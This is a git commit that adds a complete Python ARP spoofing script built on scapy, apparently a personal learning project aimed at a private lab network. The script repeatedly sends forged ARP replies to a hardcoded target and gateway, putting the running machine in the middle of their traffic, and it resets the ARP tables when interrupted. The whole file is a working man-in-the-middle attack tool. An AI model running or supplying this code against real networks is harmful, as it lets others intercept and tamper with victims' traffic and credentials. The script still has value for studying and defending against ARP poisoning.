18108c0cb00994d08cc5caf317a0bb72b825c8b0
João Campos <67153727+joaocampossss@users.noreply.github.com>
2024-06-01 17:20:23 +0100

    Create arp_spoof.py

---
+++ Projects/arp_spoof.py
@@ -0,0 +1,41 @@
+#!/usr/bin/env python3
+
+import time
+import scapy.all as scapy
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    scapy.send(packet, verbose=False, count=4)
+
+target_ip = '192.168.19.140'
+gateway_ip = '192.168.19.2'
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print(f"\r[+] Packets sent: {sent_packets_count}", end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print(' [+] Detected CTRL + C ....... Quitting')
+finally:
+    print('[+] Resetting ARP tables........ Please Wait')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
